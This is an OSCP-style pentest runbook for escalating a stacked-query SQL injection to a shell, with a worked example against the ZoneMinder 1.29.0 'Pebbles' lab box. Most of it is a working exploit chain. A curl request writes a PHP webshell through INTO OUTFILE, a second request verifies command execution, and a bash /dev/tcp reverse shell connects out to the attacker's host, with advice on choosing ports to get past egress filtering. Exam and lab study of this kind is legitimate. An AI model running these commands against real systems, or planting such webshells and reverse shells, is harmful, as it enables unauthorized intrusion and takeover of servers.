---
tags: [oscp, foothold, sqli, runbook]
box_sources: [Pebbles]
---

# Foothold — SQLi to Shell

*You have confirmed SQLi (stacked queries). Web root is known. Write a webshell, get a reverse shell.*

---

| Command | Evidence | Works when | Notes | ✅ Go to | ❌ If nothing works |
|---|---|---|---|---|---|
| `curl -s -X POST "$URL" -d "limit=100;SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/cmd.php'#"` | No error in response; file appears at web path | Stacked queries work + MySQL has FILE privilege + web root is writable | Adapt endpoint and POST param to the app. Web root must be writable by the MySQL process user. Get web root from SQL error messages or `/etc/$app/config`. | Test RCE | MySQL process lacks FILE or write access → try UDF sys_exec to create the file |
| `curl -s "http://$BoxIP/cmd.php?cmd=id"` | `uid=33(www-data)` (or similar) | Webshell wrote successfully | Confirms RCE. Test with `id` before firing a reverse shell. | Fire reverse shell | File not found → OUTFILE path wrong, recheck web root |
| `curl -G "http://$BoxIP/cmd.php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$LocalIP/$Port 0>&1'"` | Shell lands on listener | RCE works, egress open on `$Port` | Start listener first. Use port 80 or 443 on PG boxes (egress filtered). `--data-urlencode` handles special chars cleanly. | [[Shell - Upgrade]] | No connection → try different port (80/443), check listener, check `$LocalIP` |

---

## How to find the web root

Three sources, in order:

1. **SQL error messages** — verbose errors in the API response often include the full PHP file path. Extract the directory portion.
   - Example: `File: /usr/share/zoneminder/www/includes/database.php` → web root = `/usr/share/zoneminder/www/`

2. **App config** — most web apps store DB config in `/etc/$app/` or `/var/www/$app/config/`.
   - Example: `/etc/zm/zm.conf` for ZoneMinder

3. **Wordlist guess** — common web roots: `/var/www/html`, `/var/www/$hostname`, `/usr/share/$app/www`, `/srv/www/htdocs`

---

## Pebbles Example (ZoneMinder 1.29.0 — EDB-41239)

```bash
# 1. Confirm SQLi via SLEEP
time curl -s -X POST "http://$BoxIP/zm/index.php" \
  -d "view=request&request=log&task=query&limit=100;SELECT SLEEP(5)#"
# Expect: ~5 seconds total

# 2. Write webshell (web root leaked from error in response body)
curl -s -X POST "http://$BoxIP/zm/index.php" \
  -d "view=request&request=log&task=query&limit=100;SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/usr/share/zoneminder/www/cmd.php'#"

# 3. Verify RCE
curl -s "http://$BoxIP/zm/cmd.php?cmd=id"
# uid=33(www-data) ...

# 4. Reverse shell (port 80 bypasses PG egress filter)
curl -G "http://$BoxIP/zm/cmd.php" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$LocalIP/80 0>&1'"
```

---

## Module Links

[[10. SQL Injection Attacks]] | [[09. Common Web Application Attacks]]
## External Resources

- [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [RevShells](https://www.revshells.com/) for reverse-shell selection
- [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
- [ippsec.rocks](https://ippsec.rocks/) for practical walkthrough searches
